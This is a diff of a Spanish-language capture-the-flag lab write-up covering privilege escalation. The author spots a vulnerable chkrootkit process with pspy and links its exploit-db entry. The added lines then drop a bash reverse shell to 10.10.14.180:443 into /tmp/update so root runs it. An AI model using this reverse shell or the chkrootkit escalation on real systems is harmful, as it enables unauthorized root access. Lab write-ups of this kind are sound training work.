@@ -140,12 +140,16 @@ Así que ahora simplemente con la clave privada previamente copiada la usaremos 
 
 Ya dentro podemos acceder a la primera flag de user.txt
 ![](Pasted%20image%2020260423193958.png)
+## Escalada de privilegios
+Pasé el programa de pspy (https://github.com/dominicbreuker/pspy) para ver procesos que sean interesante y identifiqué que hay un proceso de chkrootkit el cuál tiene una vulnerabilidad explotable para escalar privilegios https://www.exploit-db.com/exploits/33899
+![](Pasted%20image%2020260423200654.png)
 
-Comprobando el crontab veremos que hay un proceso ejecutandose por el root llamado report-reset.sh
+Para ello debemos crear una reverseshell en /tmp que se llame update, este se ejecutara y seremos root exitosamente.
+```bash
+#!/bin/bash
 
-![](Pasted%20image%2020260423194045.png) 
+bash -i >& /dev/tcp/10.10.14.180/443 0>&1
+```
 
-Así que lo configuraremos para escalar privilegios como root
-
-![](Pasted%20image%2020260423194448.png) 
-
+Así dará por concluido el laboratorio con la última flag sacada
+![](Pasted%20image%2020260423200905.png)
